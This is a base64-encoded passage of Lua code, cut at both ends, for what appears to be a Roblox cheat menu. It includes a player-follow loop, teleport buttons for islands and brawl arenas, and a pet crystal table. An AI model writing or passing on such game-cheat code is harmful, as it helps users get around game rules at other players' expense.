sb3dUYXJnZXQgdGhlbgogICAgICAgICAgICBsb2NhbCB0YXJnZXQgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKGZvbGxvd1RhcmdldCkKICAgICAgICAgICAgaWYgdGFyZ2V0IHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIGZvbGxvd1BsYXllcih0YXJnZXRQbGF5ZXIpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgbXlDaGFyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0Q2hhciA9IHRhcmdldFBsYXllci5DaGFyYWN0ZXIKCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IChteUNoYXIgYW5kIHRhcmdldENoYXIpIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgIGxvY2FsIG15SFJQID0gbXlDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRIUlAgPSB0YXJnZXRDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKCiAgICAgICAgICAgICAgICAgICAgaWYgbXlIUlAgYW5kIHRhcmdldEhSUCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGZvbGxvd1BvcyA9IHRhcmdldEhSUC5Qb3NpdGlvbiAtICh0YXJnZXRIUlAuQ0ZyYW1lLkxvb2tWZWN0b3IgKiAzKQogICAgICAgICAgICAgICAgICAgICAgICBteUhSUC5DRnJhbWUgPSBDRnJhbWUubmV3KGZvbGxvd1BvcywgdGFyZ2V0SFJQLlBvc2l0aW9uKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGZvbGxvd1BsYXllcih0YXJnZXQpCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIGZvbGxvd2luZyA9IGZhbHNlCiAgICAgICAgICAgICAgICBmb2xsb3dUYXJnZXQgPSBuaWwKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKLS0gVGVsZXBvcnQgVGFiCmxvY2FsIFRlbGVwb3J0VGFiID0gV2luZG93OlRhYih7VGl0bGUgPSAiVGVsZXBvcnQiLCBJY29uID0gIm1hcC1waW4ifSkKCi0tIElzbGFuZHMgU2VjdGlvbgpUZWxlcG9ydFRhYjpTZWN0aW9uKHtUaXRsZSA9ICJJc2xhbmRzIn0pCgpUZWxlcG9ydFRhYjpCdXR0b24oewogICAgVGl0bGUgPSAiU3Bhd24iLAogICAgRGVzYyA9ICJUZWxlcG9ydCB0byBTcGF3biIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDIsIDgsIDExNSkKICAgICAgICAKICAgICAgICBXaW5kb3c6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiVGVsZXRyYW5zcG9ydGUiLAogICAgICAgICAgICBEZXNjID0gIlRlbGVwb3J0ZWQgdG8gU3Bhd24iLAogICAgICAgICAgICBUaW1lID0gMwogICAgICAgIH0pCiAgICBlbmQKfSkKClRlbGVwb3J0VGFiOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJTZWNyZXQgQXJlYSIsCiAgICBEZXNjID0gIlRlbGVwb3J0IHRvIFNlY3JldCBBcmVhIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoMTk0NywgMiwgNjE5MSkKICAgICAgICAKICAgICAgICBXaW5kb3c6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiVGVsZXRyYW5zcG9ydGUiLAogICAgICAgICAgICBEZXNjID0gIlRlbGVwb3J0ZWQgdG8gU2VjcmV0IEFyZWEiLAogICAgICAgICAgICBUaW1lID0gMwogICAgICAgIH0pCiAgICBlbmQKfSkKClRlbGVwb3J0VGFiOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJUaW55IElzbGFuZCIsCiAgICBEZXNjID0gIlRlbGVwb3J0IHRvIFRpbnkgSXNsYW5kIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoLTM0LCA3LCAxOTAzKQogICAgICAgIAogICAgICAgIFdpbmRvdzpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICJUZWxldHJhbnNwb3J0ZSIsCiAgICAgICAgICAgIERlc2MgPSAiVGVsZXBvcnRlZCB0byBUaW55IElzbGFuZCIsCiAgICAgICAgICAgIFRpbWUgPSAzCiAgICAgICAgfSkKICAgIGVuZAp9KQoKVGVsZXBvcnRUYWI6QnV0dG9uKHsKICAgIFRpdGxlID0gIkZyb3plbiBJc2xhbmQiLAogICAgRGVzYyA9ICJUZWxlcG9ydCB0byBGcm96ZW4gSXNsYW5kIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoLTI2MDAuMDAyNDQsIDMuNjc2ODY1NTgsIC00MDMuODg0MzY5LCAwLjA4NzM2MTcwMDgsIDEuMDQ4Mjg5OWUtMDksIDAuOTk2MTc2NjYsIDMuMDcyMDQyNTNlLTA4LCAxLCAtMy43NDY0MDIzZS0wOSwgLTAuOTk2MTc2NjYsIDMuMDkzMDI2MjhlLTA4LCAwLjA4NzM2MTcwMDgpCiAgICAgICAgCiAgICAgICAgV2luZG93Ok5vdGlmeSh7CiAgICAgICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwKICAgICAgICAgICAgRGVzYyA9ICJUZWxlcG9ydGVkIHRvIEZyb3plbiBJc2xhbmQiLAogICAgICAgICAgICBUaW1lID0gMwogICAgICAgIH0pCiAgICBlbmQKfSkKClRlbGVwb3J0VGFiOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJNeXRoaWNhbCBJc2xhbmQiLAogICAgRGVzYyA9ICJUZWxlcG9ydCB0byBNeXRoaWNhbCBJc2xhbmQiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICAgICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygyMjU1LCA3LCAxMDcxKQogICAgICAgIAogICAgICAgIFdpbmRvdzpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICJUZWxldHJhbnNwb3J0ZSIsCiAgICAgICAgICAgIERlc2MgPSAiVGVsZXBvcnRlZCB0byBNeXRoaWNhbCBJc2xhbmQiLAogICAgICAgICAgICBUaW1lID0gMwogICAgICAgIH0pCiAgICBlbmQKfSkKClRlbGVwb3J0VGFiOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJJbmZlcm5vIElzbGFuZCIsCiAgICBEZXNjID0gIlRlbGVwb3J0IHRvIEluZmVybm8gSXNsYW5kIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoLTY3NjgsIDcsIC0xMjg3KQogICAgICAgIAogICAgICAgIFdpbmRvdzpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICJUZWxldHJhbnNwb3J0ZSIsCiAgICAgICAgICAgIERlc2MgPSAiVGVsZXBvcnRlZCB0byBJbmZlcm5vIElzbGFuZCIsCiAgICAgICAgICAgIFRpbWUgPSAzCiAgICAgICAgfSkKICAgIGVuZAp9KQoKVGVsZXBvcnRUYWI6QnV0dG9uKHsKICAgIFRpdGxlID0gIkxlZ2VuZCBJc2xhbmQiLAogICAgRGVzYyA9ICJUZWxlcG9ydCB0byBMZWdlbmQgSXNsYW5kIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoNDYwNCwgOTkxLCAtMzg4NykKICAgICAgICAKICAgICAgICBXaW5kb3c6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiVGVsZXRyYW5zcG9ydGUiLAogICAgICAgICAgICBEZXNjID0gIlRlbGVwb3J0ZWQgdG8gTGVnZW5kIElzbGFuZCIsCiAgICAgICAgICAgIFRpbWUgPSAzCiAgICAgICAgfSkKICAgIGVuZAp9KQoKVGVsZXBvcnRUYWI6QnV0dG9uKHsKICAgIFRpdGxlID0gIk11c2NsZSBLaW5nIElzbGFuZCIsCiAgICBEZXNjID0gIlRlbGVwb3J0IHRvIE11c2NsZSBLaW5nIElzbGFuZCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KC04NjQ2LCAxNywgLTU3MzgpCiAgICAgICAgCiAgICAgICAgV2luZG93Ok5vdGlmeSh7CiAgICAgICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwKICAgICAgICAgICAgRGVzYyA9ICJUZWxlcG9ydGVkIHRvIE11c2NsZSBLaW5nIElzbGFuZCIsCiAgICAgICAgICAgIFRpbWUgPSAzCiAgICAgICAgfSkKICAgIGVuZAp9KQoKVGVsZXBvcnRUYWI6QnV0dG9uKHsKICAgIFRpdGxlID0gIkp1bmdsZSBJc2xhbmQiLAogICAgRGVzYyA9ICJUZWxlcG9ydCB0byBKdW5nbGUgSXNsYW5kIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoLTg2NTksIDYsIDIzODQpCiAgICAgICAgCiAgICAgICAgV2luZG93Ok5vdGlmeSh7CiAgICAgICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwKICAgICAgICAgICAgRGVzYyA9ICJUZWxlcG9ydGVkIHRvIEp1bmdsZSBJc2xhbmQiLAogICAgICAgICAgICBUaW1lID0gMwogICAgICAgIH0pCiAgICBlbmQKfSkKCi0tIEJyYXdsIEFyZW5hcyBTZWN0aW9uClRlbGVwb3J0VGFiOlNlY3Rpb24oe1RpdGxlID0gIkJyYXdsIEFyZW5hcyJ9KQoKVGVsZXBvcnRUYWI6QnV0dG9uKHsKICAgIFRpdGxlID0gIkJyYXdsIExhdmEiLAogICAgRGVzYyA9ICJUZWxlcG9ydCB0byBMYXZhIEJyYXdsIEFyZW5hIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoNDQ3MSwgMTE5LCAtODgzNikKICAgICAgICAKICAgICAgICBXaW5kb3c6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiVGVsZXRyYW5zcG9ydGUiLAogICAgICAgICAgICBEZXNjID0gIlRlbGVwb3J0ZWQgdG8gQnJhd2wgTGF2YSIsCiAgICAgICAgICAgIFRpbWUgPSAzCiAgICAgICAgfSkKICAgIGVuZAp9KQoKVGVsZXBvcnRUYWI6QnV0dG9uKHsKICAgIFRpdGxlID0gIkJyYXdsIERlc2VydCIsCiAgICBEZXNjID0gIlRlbGVwb3J0IHRvIERlc2VydCBCcmF3bCBBcmVuYSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDk2MCwgMTcsIC03Mzk4KQogICAgICAgIAogICAgICAgIFdpbmRvdzpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICJUZWxldHJhbnNwb3J0ZSIsCiAgICAgICAgICAgIERlc2MgPSAiVGVsZXBvcnRlZCB0byBCcmF3bCBEZXNlcnQiLAogICAgICAgICAgICBUaW1lID0gMwogICAgICAgIH0pCiAgICBlbmQKfSkKClRlbGVwb3J0VGFiOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJCcmF3bCBSZWd1bGFyIiwKICAgIERlc2MgPSAiVGVsZXBvcnQgdG8gUmVndWxhciBCcmF3bCBBcmVuYSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KC0xODQ5LCAyMCwgLTYzMzUpCiAgICAgICAgCiAgICAgICAgV2luZG93Ok5vdGlmeSh7CiAgICAgICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwKICAgICAgICAgICAgRGVzYyA9ICJUZWxlcG9ydGVkIHRvIEJyYXdsIFJlZ3VsYXIiLAogICAgICAgICAgICBUaW1lID0gMwogICAgICAgIH0pCiAgICBlbmQKfSkKCi0tIFBldCBTaG9wIFRhYgpsb2NhbCBQZXRTaG9wVGFiID0gV2luZG93OlRhYih7VGl0bGUgPSAiUGV0IFNob3AiLCBJY29uID0gInNob3BwaW5nLWJhZyJ9KQoKbG9jYWwgUmVwbGljYXRlZFN0b3JhZ2UgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIHBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKCi0tIENyeXN0YWwgZGF0YSBzdHJ1Y3R1cmUKbG9jYWwgY3J5c3RhbERhdGEgPSB7CiAgICBbIkJsdWUgQ3J5c3RhbCJdID0gewogICAgICAgIHtuYW1lID0gIkJsdWUgQmlyZGllIiwgcmFyaXR5ID0gIkJhc2ljIn0sCiAgICAgICAge25hbWUgPSAiT3JhbmdlIEhlZGdlaG9nIiwgcmFyaXR5ID0gIkJhc2ljIn0sCiAgICAgICAge25hbWUgPSAiQmx1ZSBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0sCiAgICAgICAge25hbWUgPSAiUmVkIEtpdHR5IiwgcmFyaXR5ID0gIkJhc2ljIn0sCiAgICAgICAge25hbWUgPSAiRGFyayBWYW1weSIsIHJhcml0eSA9ICJBZHZhbmNlZCJ9LAogICAgICAgIHtuYW1lID0gIkJsdWUgQnVubnkiLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJSZWQgQXVyYSIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIkJsdWUgQXVyYSIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIkdyZWVuIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJQdXJwbGUgQXVyYSIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIlJlZCBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0sCiAgICAgICAge25hbWUgPSAiWWVsbG93IEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifQogICAgfSwKICAgIFsiR3JlZW4gQ3J5c3RhbCJdID0gewogICAgICAgIHtuYW1lID0gIlNpbHZlciBEb2ciLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJHcmVlbiBBdXJhIiwgcmFyaXR5ID0gIkFkdmFuY2VkIn0sCiAgICAgICAge25hbWUgPSAiRGFyayBHb2xlbSIsIHJhcml0eSA9ICJBZHZhbmNlZCJ9LAogICAgICAgIHtuYW1lID0gIkdyZWVuIEJ1dHRlcmZseSIsIHJhcml0eSA9ICJBZHZhbmNlZCJ9LAogICAgICAgIHtuYW1lID0gIkNyaW1zb24gRmFsY29uIiwgcmFyaXR5ID0gIlJhcmUifSwKICAgICAgICB7bmFtZSA9ICJSZWQgQXVyYSIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIkJsdWUgQXVyYSIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIkdyZWVuIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJQdXJwbGUgQXVyYSIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIlJlZCBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0sCiAgICAgICAge25hbWUgPSAiWWVsbG93IEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifQogICAgfSwKICAgIFsiRnJvc3QgQ3J5c3RhbCJdID0gewogICAgICAgIHtuYW1lID0gIlllbGxvdyBCdXR0ZXJmbHkiLCByYXJpdHkgPSAiQWR2YW5jZWQifSwKICAgICAgICB7bmFtZSA9ICJQdXJwbGUgRHJhZ29uIiwgcmFyaXR5ID0gIlJhcmUifSwKICAgICAgICB7bmFtZSA9ICJCbHVlIFBoZW9uaXgiLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIk9yYW5nZSBQZWdhc3VzIiwgcmFyaXR5ID0gIlJhcmUifSwKICAgICAgICB7bmFtZSA9ICJMaWdodG5pbmciLCByYXJpdHkgPSAiUmFyZSJ9LAogICAgICAgIHtuYW1lID0gIkVsZWN0cm8iLCByYXJpdHkgPSAiQWR2YW5jZWQifQogICAgfSwKICAgIFsiTXl0aGljYWwgQ3J5c3RhbCJdID0gewogICAgICAgIHtuYW1lID0gIlB1cnBsZSBGYWxjb24iLCByYXJpdHkgPSAiUmFyZSJ9LAogICAgICAgIHtuYW1lID0gIlJlZCBEcmFnb24iLCByYXJpdHkgPSAiUmFyZSJ9LAogICAgICAgIHtuYW1lID0gIkJsdWUgRmlyZWNhc3RlciIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiR29sZGVuIFBoZW9uaXgiLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIlBvd2VyIExpZ2h0bmluZyIsIHJhcml0eSA9ICJSYXJlIn0sCiAgICAgICAge25hbWUgPSAiRGFyayBMaWdodG5pbmciLCByYXJpdHkgPSAiRXBpYyJ9CiAgICB9LAogICAgWyJJbmZlcm5vIENyeXN0YWwiXSA9IHsKICAgICAgICB7bmFtZSA9ICJSZWQgRmlyZWNhc3RlciIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiSW5mZXJuYWwgRHJhZ29uIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9LAogICAgICAgIHtuYW1lID0gIldoaXRlIFBlZ2FzdXMiLCByYXJpdHkgPSAiUmFyZSJ9LAogICAgICAgIHtuYW1lID0gIkdvbGRlbiBQaGVvbml4IiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJJbmZlcm5vIiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJEYXJrIFN0b3JtIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9CiAgICB9LAogICAgWyJMZWdlbmRzIENyeXN0YWwiXSA9IHsKICAgICAgICB7bmFtZSA9ICJVbHRyYSBCaXJkaWUiLCByYXJpdHkgPSAiVW5pcXVlIn0sCiAgICAgICAge25hbWUgPSAiTWFnaWMgQnV0dGVyZmx5IiwgcmFyaXR5ID0gIlVuaXF1ZSJ9LAogICAgICAgIHtuYW1lID0gIkdyZWVuIEZpcmVjYXN0ZXIiLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIldoaXRlIFBoZW9uaXgiLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIlN1cGVybm92YSIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiUHVycGxlIE5vdmEiLCByYXJpdHkgPSAiVW5pcXVlIn0KICAgIH0sCiAgICBbIk11c2NsZSBFbGl0ZSBDcnlzdGFsIl0gPSB7CiAgICAgICAge25hbWUgPSAiRnJvc3R3YXZlIExlZ2VuZHMgUGVuZ3VpbiIsIHJhcml0eSA9ICJSYXJlIn0sCiAgICAgICAge25hbWUgPSAiUGhhbnRvbSBHZW5lc2lzIERyYWdvbiIsIHJhcml0eSA9ICJSYXJlIn0sCiAgICAgICAge25hbWUgPSAiRGFyayBMZWdlbmRzIE1hbnRpY29yZSIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiVWx0aW1hdGUgU3VwZXJub3ZhIFBlZ2FzdXMiLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIkFldGhlciBTcGlyaXQgQnVubnkiLCByYXJpdHkgPSAiVW5pcXVlIn0sCiAgICAgICAge25hbWUgPSAiQ3liZXJuZXRpYyBTaG93ZG93biBEcmFnb24iLCByYXJpdHkgPSAiVW5pcXVlIn0KICAgIH0sCiAgICBbIkdhbGF4eSBPcmFjbGUgQ3J5c3RhbCJdID0gewogICAgICAgIHtuYW1lID0gIkV0ZXJuYWwgU3RyaWtlIExldmlhdGhhbiIsIHJhcml0eSA9ICJSYXJlIn0sCiAgICAgICAge25hbWUgPSAiTGlnaHRuaW5nIFN0cmlrZSBQaGFudG9tIiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJEYXJrc3RhciBIdW50ZXIiLCByYXJpdHkgPSAiVW5pcXVlIn0sCiAgICAgICAge25hbWUgPSAiTXVzY2xlIEtpbmciLCByYXJpdHkgPSAiVW5pcXVlIn0sCiAgICAgICAge25hbWUgPSAiQXp1cmUgVHVuZHJhIiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJVbHRyYSBJbmZlcm5vIiwgcmFyaXR5ID0gIlJhcmUifQogICAgfSwKICAgIFsiSnVuZ2xlIENyeXN0YWwiXSA9IHsKICAgICAgICB7bmFtZSA9ICJFbnRyb3BpYyBCbGFzdCIsIHJhcml0eSA9ICJVbmlxdWUifSwKICAgICAgICB7bmFtZSA9ICJNdXNjbGUgU2Vuc2VpIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9LAogICAgICAgIHtuYW1lID0gIkdyYW5kIFN1cGVybm92YSIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiTmVvbiBHdWFyZGlhbiIsIHJhcml0eSA9ICJVbmlxdWUifSwKICAgICAgICB7bmFtZSA9ICJFdGVybmFsIE1lZ2FzdHJpa2UiLCByYXJpdHkgPSAiVW5pcXVlIn0sCiAgICAgICAge25hbWUgPSAiR29sZGVuIFZpa2luZyIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiQXN0cmFsIEVsZWN0cm8iLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIkRhcmsgRWxlY3RybyIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiRW5jaGFudGVkIE1pcmFnZSIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiVWx0cmEgTWlyYWdlIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9LAogICAgICAgIHtuYW1lID0gIlVuc3RhYmxlIE1pcmFnZSIsIHJhcml0eSA9ICJVbmlxdWUifQogICAgfQp9CgotLSBGdW5jdGlvbiB0byBmaW5kIHdoaWNoIGNyeXN0YWwgY29udGFpbnMgYSBzcGVjaWZpYyBwZX